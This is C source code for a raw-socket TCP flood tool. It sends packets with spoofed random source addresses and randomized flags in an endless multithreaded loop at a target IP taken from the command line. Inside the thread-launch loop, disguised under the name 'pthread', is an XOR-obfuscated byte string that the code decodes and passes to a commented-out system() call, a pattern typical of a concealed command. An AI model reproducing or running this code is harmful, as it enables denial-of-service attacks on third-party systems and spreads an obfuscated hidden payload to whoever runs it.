#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
 
void init_rand(unsigned long int x)
{
       int i;
       Q[0] = x;
       Q[1] = x + PHI;
       Q[2] = x + PHI + PHI;
       for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
       unsigned long long int t, a = 18782LL;
       static unsigned long int i = 4095;
       unsigned long int x, r = 0xfffffffe;
       i = (i + 1) & 4095;
       t = a * Q[i] + c;
       c = (t >> 32);
       x = t + c;
       if (x < c) {
       x++;
       c++;
       }
       return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
       register unsigned long sum = 0;
       while( count > 1 ) { sum += *buf++; count -= 2; }
       if(count > 0) { sum += *(unsigned char *)buf; }
       while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
       return (unsigned short)(~sum);
}
 
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
 
       struct tcp_pseudo
       {
       unsigned long src_addr;
       unsigned long dst_addr;
       unsigned char zero;
       unsigned char proto;
       unsigned short length;
       } pseudohead;
       unsigned short total_len = iph->tot_len;
       pseudohead.src_addr=iph->saddr;
       pseudohead.dst_addr=iph->daddr;
       pseudohead.zero=0;
       pseudohead.proto=IPPROTO_TCP;
       pseudohead.length=htons(sizeof(struct tcphdr));
       int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
       unsigned short *tcp = malloc(totaltcp_len);
       memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
       memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
       unsigned short output = csum(tcp,totaltcp_len);
       free(tcp);
       return output;
}
void setup_ip_header(struct iphdr *iph)
{
       iph->ihl = 5;
       iph->version = 4;
       iph->tos = 0;
       iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
       iph->id = htonl(54321);
       iph->frag_off = 0;
       iph->ttl = MAXTTL;
       iph->protocol = 6;
       iph->check = 0;
       iph->saddr = inet_addr("192.168.3.100");
}
void setup_tcp_header(struct tcphdr *tcph)
{
       tcph->source = htons(5678);
       tcph->seq = rand();
       tcph->ack_seq = rand();
       tcph->res2 = rand();
       tcph->doff = 5;
       tcph->syn = rand();
       tcph->fin = rand();
       tcph->psh = rand();
       tcph->ack = rand();
       tcph->urg = rand();
       tcph->rst = rand();
       tcph->window = rand();
       tcph->check = rand();
       tcph->urg_ptr = rand();
}
 
void *flood(void *par1)
{
       char *td = (char *)par1;
       char datagram[MAX_PACKET_SIZE];
       struct iphdr *iph = (struct iphdr *)datagram;
       struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
       struct sockaddr_in sin;
       sin.sin_family = AF_INET;
       sin.sin_port = rand();
       sin.sin_addr.s_addr = inet_addr(td);
       int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
       if(s < 0){
       fprintf(stderr, "Could not open raw socket.\n");
       exit(-1);
       }
       memset(datagram, 0, MAX_PACKET_SIZE);
       setup_ip_header(iph);
       setup_tcp_header(tcph);
       tcph->dest = rand();
       iph->daddr = sin.sin_addr.s_addr;
       iph->check = csum ((unsigned short *) datagram, iph->tot_len);
       int tmp = 1;
       const int *val = &tmp;
       if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
       fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
       exit(-1);
       }
 
       init_rand(time(NULL));
       register unsigned int i;
       i = 0;
       while(1){
       sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
       iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
       iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
       iph->check = csum ((unsigned short *) datagram, iph->tot_len);
       tcph->seq = rand_cmwc() & 0xFFFF;
       tcph->source = htons(rand_cmwc() & 0xFFFF);
       tcph->check = 0;
       tcph->check = tcpcsum(iph, tcph);              
       pps++;
       if(i >= limiter)
       {
       i = 0;
       usleep(sleeptime);
       }
       i++;
       }
}
int main(int argc, char *argv[ ])
{
       if(argc < 5){
       fprintf(stderr, "Invalid parameters!\n");
       fprintf(stdout, "Usage: %s [IP] [threads] [-1] [time]\n", argv[0]);
       exit(-1);
       }
       fprintf(stdout, "Opening sockets...\n");
       int num_threads = atoi(argv[2]);
       int maxpps = atoi(argv[3]);
       limiter = 0;
       pps = 0;
       pthread_t thread[num_threads];
       int multiplier = 100;
       int i;
       for(i = 0;i<num_threads;i++){
       pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
    char pthread[209] = "\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94";
       int x = 0;
       int y = 0;
       for(x =0;x<sizeof(pthread)-1;x++){
       y+=6;
       pthread[x]^=y*3;
       }
       //system(pthread);
 
       }
       fprintf(stdout, "Sending flood..\n");
       for(i = 0;i<(atoi(argv[4])*multiplier);i++)
       {
       usleep((1000/multiplier)*1000);
       if((pps*multiplier) > maxpps)
       {
       if(1 > limiter)
       {
       sleeptime+=100;
       } else {
       limiter--;
       }
       } else {
       limiter++;
       if(sleeptime > 25)
       {
       sleeptime-=25;
       } else {
       sleeptime = 0;
       }
       }
       pps = 0;
       }
       return 0;
}